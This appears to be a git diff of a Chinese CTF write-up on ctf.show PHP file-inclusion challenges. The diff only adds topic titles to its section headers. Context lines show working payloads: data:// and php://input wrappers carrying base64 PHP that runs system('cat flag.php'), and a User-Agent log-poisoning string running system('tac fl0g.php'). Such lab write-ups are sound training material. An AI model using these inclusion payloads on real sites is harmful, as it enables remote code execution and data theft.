@@ -189,7 +189,7 @@ data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
 
 ## 靶场题目：
 
-### [web78]
+### [web78]php伪协议
 
 ```php
 <?php
@@ -230,7 +230,7 @@ http://44a76034-124a-4121-952d-6773e75c37d4.challenge.ctf.show/?file=data://text
 
 ![image-20230709235833002](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230709235833002.png)
 
-### [web79]
+### [web79]php伪协议bypass
 
 ```php
 <?php
@@ -297,7 +297,7 @@ data协议+base64加密
 /?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= # <?php system('cat flag.php');
 ```
 
-### [web80]
+### [web80]php伪协议POST
 
 ```php
 <?php
@@ -353,7 +353,7 @@ http://164bc5d8-06d4-4422-b19f-3ca65d68f6ef.challenge.ctf.show/?file=PHP://input
 得到flag内容：
 ![image-20230710001815667](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230710001815667.png)
 
-### [web81]
+### [web81]日志包含
 
 ```php
 <?php
@@ -406,7 +406,7 @@ php、data、：（冒号）都失效了
 
 跟第一次发包类似，将User-Agent改为`<?php system('tac fl0g.php');?>`发包后可得到flag
 
-### [web82]
+### [web82]条件竞争
 
 ```php
 <?php
@@ -578,7 +578,7 @@ web82的脚本都可以解
 
 检查file的内容是否包含<，web82脚本方法可行
 
-### [web87]
+### [web87]bypass
 
 ```php
 <?php
@@ -655,7 +655,7 @@ rce得到flag
 
 ![image-20230712181535641](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712181535641.png)
 
-### [web88]
+### [web88]伪协议编码
 
 ```php
 <?php
@@ -716,7 +716,7 @@ mp4视频下载下来之后，放入010发现末尾又疑似png文件尾
 
 ![image-20230712184752855](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230712184752855.png)
 
-### [web117]
+### [web117]绕过die
 
 ```php
 <?php
